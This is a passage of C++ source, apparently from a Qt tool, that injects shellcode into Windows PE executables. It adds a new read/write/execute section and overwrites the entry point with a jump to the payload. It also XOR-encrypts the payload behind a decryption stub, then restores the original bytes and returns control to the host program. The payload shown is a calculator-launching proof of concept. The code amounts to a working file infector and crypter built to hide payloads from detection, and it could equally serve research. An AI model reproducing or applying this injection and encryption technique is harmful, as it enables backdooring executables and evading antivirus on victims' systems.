                         reinterpret_cast<char*>(this->payload_vec.data()),
                         this->payload_num_of_bytes);

    //getting the asm instructions to jump back to the text section
    std::string jump_back_to_text_section_asm = "";
    get_jump_back_to_text_section_instruction_asm(jump_back_to_text_section_asm
                                                  ,this->entry_point_of_text_section);

    //converting the above asm instructions to machine code
    machine_code_vec.clear();
    asm_to_machine_code(jump_back_to_text_section_asm,this->machine_code_vec,
                        this->machine_code_num_of_bytes);

    //putting in the jump back to text section into payload_section_buffer_ptr
    populate_section_ptr(payload_section_buffer_ptr,
                         reinterpret_cast<char*>(this->machine_code_vec.data()),
                         this->machine_code_num_of_bytes);



    //===================================================================================
    rewrite_bytes_to_buffer(this->buffer, (char*)this->dos_header_pointer,
                            this->buffer_cursor,sizeof(IMAGE_DOS_HEADER));
    //replacing back the edited image_NT_header_ptr into the buffer
    //number of sections was increased by 1
    //new size of the pe file was set
    //by adding the payload_virtual_size to SizeOfImage
    this->buffer_cursor = this->exe_header_file_offset;
    rewrite_bytes_to_buffer(this->buffer, (char*)this->image_NT_header_ptr,
                            this->buffer_cursor,sizeof(IMAGE_NT_HEADERS32));

    //need to be used to find the payload section later
    unsigned int start_of_section_headers_offset = this->buffer_cursor + sizeof(IMAGE_NT_HEADERS32);

    //need to add the cursor + the size of IMAGE_NT_HEADERS32 + the index_of_text_section * size of IMAGE_SECTION_HEADER
    this->buffer_cursor = start_of_section_headers_offset + (this->index_of_text_section * sizeof(IMAGE_SECTION_HEADER));
    //this->buffer_cursor += this->index_of_text_section * sizeof(IMAGE_SECTION_HEADER);
    rewrite_bytes_to_buffer(this->buffer, (char*)this->text_section_header_ptr,
                            this->buffer_cursor,sizeof(IMAGE_SECTION_HEADER));

    //putting in the new payload section header
    //payload raw address is previous raw size + previous raw data offset
    //payload raw data size was calculated via file_alignment
    //payload virtual size is calculated via section alignment
    //payload virtual address is previous virtual address + payloads virtual size
    //payload characteristics is set to read/write/execute
    this->buffer_cursor = start_of_section_headers_offset + (this->index_of_payload_section * sizeof(IMAGE_SECTION_HEADER));
    rewrite_bytes_to_buffer(this->buffer, (char*)this->payload_section_header_ptr,
                            this->buffer_cursor,sizeof(IMAGE_SECTION_HEADER));

    //need to resize buffer to accomodate the new payload section
    __int64 new_buffer_size = this->buffer.size() + this->payload_raw_data_size;
    this->buffer.resize(new_buffer_size);

    //start at the payload_section_header_ptr pointer to raw data
    //putting in the payload into buffer
    this->buffer_cursor = this->payload_section_header_ptr->PointerToRawData;
    rewrite_bytes_to_buffer(this->buffer, (char*)payload_section_buffer_original,
                            this->buffer_cursor,this->payload_raw_data_size);

    this->buffer_cursor = this->text_section_raw_data_offset;
    rewrite_bytes_to_buffer(this->buffer, (char*)this->text_section_buffer_original,
                            this->buffer_cursor,this->size_of_text_section);


     print_section_headers(image_section_header_vec);
    //writing to file
    write_exe_file(this->morphed_exe_file_path, this->buffer);
    //free memory
    delete[] payload_section_buffer_original;
    payload_section_buffer_ptr = nullptr;
    delete payload_section_buffer_ptr;

    std::cout << std::endl;

    return SUCCESS_MORPHED_EXECUTABLE;
}

QString Morph_Executable_Controller::morph_exe_with_encryption(QString exe_file_path)
{
    QString status = "";
    //reading bytes of a exe file
    status = read_file_into_vector(exe_file_path);
    error_warning_message_box(status);

    //get image dos header pointer
    //image_dos_header_file_cursor is at offset 0 as this pe header is located at the first offset of the exe
    this->dos_header_pointer = get_ptr_image_dos_header(this->buffer,this->image_dos_header_file_cursor);

    //validate the image dos header must be equals to MZ(ASCII)
    status = validate_image_dos_signature(dos_header_pointer);
    error_warning_message_box(status);


    // getting image_NT_header_cursor and setting exe_header_file_offset
    // Here we are assuming that buffer has the same bytes as the original file
    // so we need to get the exe_header_file_offset
    // which is the value of the e_lfanew attribute in dos_header_pointer
    this->image_NT_header_file_cursor = this->dos_header_pointer->e_lfanew;
    this->exe_header_file_offset = this->image_NT_header_file_cursor;

    // get the image_NT_header_ptr
    // the offset is at e_lfanew which is stored in image_NT_header_file_cursor
    this->image_NT_header_ptr = get_ptr_image_NT_header(this->buffer,image_NT_header_file_cursor);

    //validate the file PE signature must be equal to some dog shit
    status = validate_PE_signature(image_NT_header_ptr);
    error_warning_message_box(status);


    printf("Before: Number of Sections : 0x%x\n", this->image_NT_header_ptr->FileHeader.NumberOfSections);
    //increasing the number of sections to allocate memory for payload
    this->image_NT_header_ptr->FileHeader.NumberOfSections += 1;
    printf("After: Number of Sections : 0x%x\n", this->image_NT_header_ptr->FileHeader.NumberOfSections);

    //randomizing the new payload section name
    const std::string payload_section_name = randomize_payload_section_name();


     //this is the entry point when the pe file is loaded to virtual memory
    //must add image base + the address of entry point
    this->entry_point_of_text_section = this->image_NT_header_ptr->OptionalHeader.ImageBase + this->image_NT_header_ptr->OptionalHeader.AddressOfEntryPoint;
    printf("ImageBase : 0x%x\nLoaded Entry point : 0x%x\n", this->image_NT_header_ptr->OptionalHeader.ImageBase, this->entry_point_of_text_section);

    //saving the file and section alignments in variables
    this->file_alignment =this->image_NT_header_ptr->OptionalHeader.FileAlignment;
    this->section_alignment = this->image_NT_header_ptr->OptionalHeader.SectionAlignment;

    // This cursor will be used to cycle through each section in the pe file
    // need to add exe file offset + the size of an IMAGE_NT_HEADERS32 struct to get to the first section
    unsigned int section_header_cursor = exe_header_file_offset + sizeof(IMAGE_NT_HEADERS32);

    //storing all image section headers inside a vector
    store_image_section_headers_in_vec(buffer, image_section_header_vec,
                                       image_NT_header_ptr, section_header_cursor);

    //getting the index of the .text section inside the image_section_header_vec
    status = get_section_header_index_by_name(TEXT_SECTION_NAME, image_section_header_vec,image_NT_header_ptr,index_of_text_section);
    error_warning_message_box(status);

    //getting the raw data offset of the .text section via image_section_header_vec
    //note that the above function saved the index of the .text section
    this->text_section_raw_data_offset = this->image_section_header_vec[this->index_of_text_section]->PointerToRawData;

    //storing the whole .text section inside the text_section_header_ptr
    this->text_section_header_ptr = this->image_section_header_vec[this->index_of_text_section];

    //getting the raw data size of the .text section via text_section_header_ptr
    this->size_of_text_section = this->text_section_header_ptr->SizeOfRawData;

    //setting the characteristics to read/write/execute
    this->text_section_header_ptr->Characteristics = SECTIONCHARACTERISTICSTOSET;

    //setting the payload section name from payload_section_name (randomized earlier),
    //which is at the end of the image_section_header_vec
    set_new_section_name(this->image_section_header_vec[this->image_section_header_vec.size()-1],
                           payload_section_name);


    //getting the index of the .payload section inside the image_section_header_vec
    status = get_section_header_index_by_name(payload_section_name, image_section_header_vec,
                                              image_NT_header_ptr,index_of_payload_section);
    error_warning_message_box(status);

    //storing the whole .payload section inside the payload_section_header_ptr
    this->payload_section_header_ptr = image_section_header_vec[index_of_payload_section];

    //gets the index corresponding to the radio button
    int chosen_payload_index = get_payload_radio_button();


    switch(chosen_payload_index)
    {
        case 0:
            set_morphed_exe_name(exe_file_path,"_CALC");
            this->payload_num_of_bytes = sizeof(CALC_SHELLCODE) - 1; //the -1 is to get rid of terminating character
            populate_payload_vec(this->payload_vec,CALC_SHELLCODE,this->payload_num_of_bytes);
            break;

        default:
            break;
    }

    //setting the full file path
    set_morphed_exe_file_path(exe_file_path);

    //calculate the file alignment factor to align the section
    calculate_file_alignment_factor(this->payload_num_of_bytes,this->file_alignment,this->file_alignment_factor);

    //calculate the payload raw data size via file_alignment
    this->payload_raw_data_size = this->file_alignment_factor * this->file_alignment;

    //calculate the section alignment factor for the section
    //needs the virtual size of the section before the payload section for calculation
    calculate_section_alignment_factor(payload_num_of_bytes,section_alignment,section_alignment_factor,
                                       image_section_header_vec[index_of_payload_section-1]);

    //calculate payloads virtual size via section alignment
    this->payload_virtual_size = this->section_alignment_factor * this->section_alignment;

    //calculate payloads raw address
    //previous raw size + previous raw data offset
    this->payload_raw_address = image_section_header_vec[index_of_payload_section-1]->SizeOfRawData
                                + image_section_header_vec[index_of_payload_section-1]->PointerToRawData;

    //calculate the payloads va
    //previous virtual address + payloads virtual size
    this->payload_virtual_address = image_section_header_vec[index_of_payload_section-1]->VirtualAddress
                                    + this->payload_virtual_size;

    //setting the relevant values in the new payload section header via payload_section_header_ptr
    init_payload_section_header(this->payload_section_header_ptr,
                                this->payload_raw_address,
                                this->payload_raw_data_size,
                                this->payload_virtual_address,
                                this->payload_virtual_size,
                                this->SECTIONCHARACTERISTICSTOSET);

    //setting the new size of the pe file
    //via image_NT_header_ptr by adding on the payload_virtual_size
    this->image_NT_header_ptr->OptionalHeader.SizeOfImage += this->payload_virtual_size;

    //this is the section pivot gadget for the payload section,
    //which is used to patch back the .text section
    //currently this value is when the PE is loaded, hence we add the raw data offset of the text section
    this->starting_of_text_section_offset_on_load = this->image_NT_header_ptr->OptionalHeader.AddressOfEntryPoint -
                                    this->image_NT_header_ptr->OptionalHeader.BaseOfCode +
                                    this->text_section_raw_data_offset;

    //getting image base via image_NT_header_ptr optional header
    this->image_base = this->image_NT_header_ptr->OptionalHeader.ImageBase;

    //generating a random key for encryption scheme
    this->random_key = generate_random_key();

    unsigned int length_of_random_key = sizeof(random_key);


    //getting the start of the payload section, which is image base + payload virtual size
    this->start_of_payload_section_offset = this->image_base + this->payload_virtual_address;

    //writing assembly syntax, for jumping to payload section (section pivot gadget), into string.
    //since random key is stored in the first byte, the offset needs to + the length of the random key
    std::string jump_to_payload_asm = "mov ecx, ";
    jump_to_payload_asm += convert_num_to_hex<DWORD>(this->start_of_payload_section_offset + length_of_random_key) + ";";
    jump_to_payload_asm += "jmp ecx;";
    this->machine_code_vec.clear(); //clear vector to input new machine code

    //and converting assembly syntax into machine code
    status = asm_to_machine_code(jump_to_payload_asm,this->machine_code_vec,this->machine_code_num_of_bytes);
    error_warning_message_box(status);

    //storing the byte length of the section pivot gadget
    this->jump_to_payload_byte_length = this->machine_code_num_of_bytes;

    //putting original text section data into a pointer, to be added into the buffer later
    this->text_section_buffer_original = get_section_data_from_buffer(this->buffer,
                                                                      this->text_section_raw_data_offset,
                                                                      this->size_of_text_section);
    //storing the original text section into a pointer, for calculation
    this->text_section_buffer_ptr = this->text_section_buffer_original;


    //editing the pointer text_section_buffer_ptr to store the jump to payload instruction bytes
    //will be used to put into the actual buffer later
    //starting_of_text_section_offset_on_load must subtract by the text_section_raw_data_offset
    //to get to the physical memory of the buffer
    editing_text_section_ptr(this->text_section_buffer_ptr,
                             this->jump_to_payload_byte_length,
                             this->starting_of_text_section_offset_on_load - this->text_section_raw_data_offset,
                             this->machine_code_vec);


    //stores the payload into a variable char* and the ptr is to do calculation
    char *payload_section_buffer_original = new char [this->payload_raw_data_size];
    char *payload_section_buffer_ptr = payload_section_buffer_original;


    //to store the bytes after the decryption instruction bytes
    //so we can populate the rest in one pass
    std::vector<unsigned char> bytes_after_decryption_instructions_vec;

    //we need to store the payload entry point address into edi, so that stosd will work as intended
    //safe practice, incase edi was used or modified previously
    std::string store_payload_entry_point_in_edi_asm = "";
    store_edi(store_payload_entry_point_in_edi_asm,this->entry_point_of_text_section);
    this->machine_code_vec.clear();
    asm_to_machine_code(store_payload_entry_point_in_edi_asm,
                        this->machine_code_vec,this->machine_code_num_of_bytes);

    //adding the mov edi instructions into the vector
    add_bytes_into_vec(bytes_after_decryption_instructions_vec,this->machine_code_vec);

    //here we memorize the original bytes of the text section
    //this will be used in the payload section to patch back the overwritten text section bytes
    std::string text_section_memorized_entry_bytes = "";

    //stosd can only store a certain amount of dwords
    //this is to calculate how many stosd we need
    //storing the original entry bytes from the buffer to text_section_memorized_entry_bytes
    calculate_num_of_stosd_for_patching(text_section_memorized_entry_bytes,
                                        this->num_of_stosd,
                                        this->jump_to_payload_byte_length,
                                        this->starting_of_text_section_offset_on_load,
                                        this->buffer);



    //getting the stosd instructions asm, afew calculations must be done for big to little endian conversion
    std::string patching_entry_bytes_asm = "";
    get_stosd_instruction_asm(patching_entry_bytes_asm,
                              text_section_memorized_entry_bytes,
                              this->num_of_stosd);

    //converting patching_entry_bytes_asm to machine code
    this->machine_code_vec.clear();
    asm_to_machine_code(patching_entry_bytes_asm,this->machine_code_vec,
                        this->machine_code_num_of_bytes);

    //adding the patching_entry_bytes_asm instructions into the vector
    //currently has mov edi instructions + this patching_entry_bytes_asm
    add_bytes_into_vec(bytes_after_decryption_instructions_vec,this->machine_code_vec);

    //adding the payload instructions into the vector
    //currently has mov edi instructions + patching_entry_bytes_asm + this payload instructions
    add_bytes_into_vec(bytes_after_decryption_instructions_vec,this->payload_vec);

    //getting the asm instructions to jump back to the text section
    std::string jump_back_to_text_section_asm = "";
    get_jump_back_to_text_section_instruction_asm(jump_back_to_text_section_asm
                                                  ,this->entry_point_of_text_section);

    //converting the above asm instructions to machine code
    machine_code_vec.clear();
    asm_to_machine_code(jump_back_to_text_section_asm,this->machine_code_vec,
                        this->machine_code_num_of_bytes);

    //adding the jump back to text section instructions into the vector
    //currently has mov edi instructions + patching_entry_bytes_asm + payload instructions
    // + this jump back to text section instructions
    add_bytes_into_vec(bytes_after_decryption_instructions_vec,this->machine_code_vec);

    //encrypting contents of the vector, by xor with the random key
    encrypt_bytes_after_decryption_instruction_vec(bytes_after_decryption_instructions_vec,this->random_key);


    // ================== START HERE FOR DECRYPTION SCHEME ================================
    std::string decrypt_asm = "";
    get_decryption_asm(decrypt_asm,
                       this->start_of_payload_section_offset,
                       length_of_random_key,
                       this->machine_code_vec,
                       this->machine_code_num_of_bytes,
                       bytes_after_decryption_instructions_vec.size());

    //putting a random key into the beginning of the payload section
    add_random_key_to_payload_section_buffer_ptr(payload_section_buffer_ptr, this->random_key);


    //adding in the decryption routine into payload_section_buffer_ptr
    //(this->machine_code_vec.data()) contains the decryption routine
    populate_section_ptr(payload_section_buffer_ptr,
                         reinterpret_cast<char*>(this->machine_code_vec.data()),
                         this->machine_code_num_of_bytes);


    //putting in the jump back to text section into payload_section_buffer_ptr
    populate_section_ptr(payload_section_buffer_ptr,
                         reinterpret_cast<char*>(bytes_after_decryption_instructions_vec.data()),
                         bytes_after_decryption_instructions_vec.size());


    //===================================================================================

    rewrite_bytes_to_buffer(this->buffer, (char*)this->dos_header_pointer,
                            this->buffer_cursor,sizeof(IMAGE_DOS_HEADER));
    //replacing back the edited image_NT_header_ptr into the buffer
    //number of sections was increased by 1
    //new size of the pe file was set
    //by adding the payload_virtual_size to SizeOfImage
    this->buffer_cursor = this->exe_header_file_offset;
    rewrite_bytes_to_buffer(this->buffer, (char*)this->image_NT_header_ptr,
                            this->buffer_cursor,sizeof(IMAGE_NT_HEADERS32));

    //need to be used to find the payload section later
    unsigned int start_of_section_headers_offset = this->buffer_cursor + sizeof(IMAGE_NT_HEADERS32);

    //need to add the cursor + the size of IMAGE_NT_HEADERS32 + the index_of_text_section * size of IMAGE_SECTION_HEADER
    this->buffer_cursor = start_of_section_headers_offset + (this->index_of_text_section * sizeof(IMAGE_SECTION_HEADER));
    //this->buffer_cursor += this->index_of_text_section * sizeof(IMAGE_SECTION_HEADER);
    rewrite_bytes_to_buffer(this->buffer, (char*)this->text_section_header_ptr,
                            this->buffer_cursor,sizeof(IMAGE_SECTION_HEADER));

    //putting in the new payload section header
    //payload raw address is previous raw size + previous raw data offset
    //payload raw data size was calculated via file_alignment
    //payload virtual size is calculated via section alignment
    //payload virtual address is previous virtual address + payloads virtual size
    //payload characteristics is set to read/write/execute
    this->buffer_cursor = start_of_section_headers_offset + (this->index_of_payload_section * sizeof(IMAGE_SECTION_HEADER));
    rewrite_bytes_to_buffer(this->buffer, (char*)this->payload_section_header_ptr,
                            this->buffer_cursor,sizeof(IMAGE_SECTION_HEADER));

    //need to resize buffer to accomodate the new payload section
    __int64 new_buffer_size = this->buffer.size() + this->payload_raw_data_size;
    this->buffer.resize(new_buffer_size);

    //start at the payload_section_header_ptr pointer to raw data
    //putting in the payload into buffer
    this->buffer_cursor = this->payload_section_header_ptr->PointerToRawData;
    rewrite_bytes_to_buffer(this->buffer, (char*)payload_section_buffer_original,
                            this->buffer_cursor,this->payload_raw_data_size);

    this->buffer_cursor = this->text_section_raw_data_offset;
    rewrite_bytes_to_buffer(this->buffer, (char*)this->text_section_buffer_original,
                            this->buffer_cursor,this->size_of_text_section);


    // print_section_headers(image_section_header_vec);
    //writing to file
    write_exe_file(this->morphed_exe_file_path, this->buffer);
    //free memory
    delete[] payload_section_buffer_original;
    payload_section_buffer_ptr = nullptr;
    delete payload_section_buffer_ptr;

    std::cout << std::endl;

    return SUCCESS_MORPHED_EXECUTABLE;
}
